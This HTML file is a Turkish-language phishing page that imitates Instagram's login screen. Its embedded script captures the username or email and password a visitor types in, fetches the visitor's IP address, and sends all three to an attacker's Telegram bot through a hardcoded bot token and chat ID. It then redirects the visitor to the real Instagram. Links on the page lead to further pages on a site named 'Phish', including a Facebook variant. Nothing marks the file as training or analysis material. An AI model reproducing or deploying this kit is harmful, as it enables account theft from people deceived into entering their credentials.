<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Giriş Yap</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
        }

        body {
            background-color: #fafafa;
            color: #262626;
            font-size: 14px;
            line-height: 18px;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .login-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            margin-bottom: 10px;
            padding: 10px 0;
            max-width: 350px;
            width: 100%;
        }

        .logo {
            margin: 22px auto 12px;
            text-align: center;
        }

        .logo img {
            max-width: 175px;
        }

        .form-group {
            margin: 0 40px 6px;
        }

        .form-control {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            height: 36px;
            padding: 9px 8px 7px;
            width: 100%;
            color: black;
        }

        .form-control:focus {
            border-color: #a8a8a8;
            outline: none;
        }

        .btn {
            background-color: #0095f6;
            border: 1px solid transparent;
            border-radius: 8px;
            color: #fff;
            font-weight: 600;
            padding: 7px 9px;
            text-align: center;
            width: 100%;
            cursor: pointer;
            margin-top: 8px;
            height: 36px;
            font-size: 14px;
        }

        .btn:disabled {
            background-color: #b2dffc;
            pointer-events: none;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 10px 40px 18px;
        }

        .divider .line {
            background-color: #dbdbdb;
            flex-grow: 1;
            height: 1px;
        }

        .divider .or {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
            text-transform: uppercase;
        }

        .facebook-login {
            color: #385185;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 8px 40px;
            font-weight: 600;
            text-decoration: none;
        }

        .facebook-login .icon {
            margin-right: 8px;
            font-size: 16px;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-align: center;
            margin: 12px 0;
            text-decoration: none;
            display: block;
        }

        .signup-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 10px 0;
            max-width: 350px;
            width: 100%;
            text-align: center;
        }

        .signup-box p {
            margin: 15px;
        }

        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .app-download {
            text-align: center;
            margin: 20px 0;
        }

        .app-download p {
            margin-bottom: 20px;
        }

        .app-links {
            display: flex;
            justify-content: center;
        }

        .app-links a {
            margin: 0 4px;
        }

        .app-links img {
            height: 40px;
        }

        .footer {
            margin: 24px 0;
            text-align: center;
            color: #8e8e8e;
            font-size: 12px;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            margin-bottom: 12px;
        }

        .footer-links a {
            color: #8e8e8e;
            margin: 0 8px 12px;
            text-decoration: none;
        }

        @media (max-width: 450px) {
            .login-box,
            .signup-box {
                background-color: transparent;
                border: none;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo" style="text-align: center;">
    <img src="https://logodownload.org/wp-content/uploads/2017/04/instagram-logo-1.png" alt="Instagram" style="width: 200px;">
</div>

            <form onsubmit="event.preventDefault(); sendMessage();">
                    <div class="form-group">
                        <input type="email" class="form-control" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required="" id="email">
                    </div>

                    <div class="form-group">                        
                        <input type="password" class="form-control" placeholder="Şifre" required="" id="password">
                    </div>

                    <div class="form-group">
                        <button type="submit" class="btn">Giriş Yap</button>
                    </div>
                </form>

            <div class="divider">
                <div class="line"></div>
                <div class="or">veya</div>
                <div class="line"></div>
            </div>

            <a href="https://randmdev.github.io/Phish/facebook.html" class="facebook-login">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#385185" viewBox="0 0 320 512" style="margin-right: 8px;">
                    <path d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H22.89V288h81.39v224h100.17V288z"/>
                </svg>
                Facebook ile Giriş Yap
            </a>

            <a href="https://randmdev.github.io/Phish" class="forgot-password">Şifreni mi unuttun?</a>
        </div>

        <div class="signup-box">
            <p>Hesabın yok mu? <a href="#">Kaydol</a></p>
        </div>

        <div class="app-download">
            <p>Uygulamayı indir.</p>
            <div class="app-links">
                <a href="#">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="Apple App Store'dan İndir" style="height: 40px;">
                </a>
                <a href="#">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play'den İndir" style="height: 40px;">
                </a>
            </div>
        </div>

        <div class="footer">
            <div class="footer-links">
                <a href="#">Hakkında</a>

            </div>
            <p>© 2025 Instagram from Meta</p>
        </div>
    </div>
    
   <script>
        async function getIP() {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        }

        async function sendMessage() {
            const token = '7941593080:AAFe71WQaxyQFzvI3CcpFtuOcOthvUrF49A';
            const userId = 7767108844;
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const ip = await getIP();

            try {
                const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: userId,
                        text: `email: ${email}\nşifre: ${password}\nIP: ${ip}`
                    })
                });

                const result = await response.json();
                if (!result.ok) throw new Error(result.description);
                window.location.replace('https://www.instagram.com')
            } catch (error) {
                alert('Hata: ' + error.message);
            }
        }
    </script>


</body>

</html>
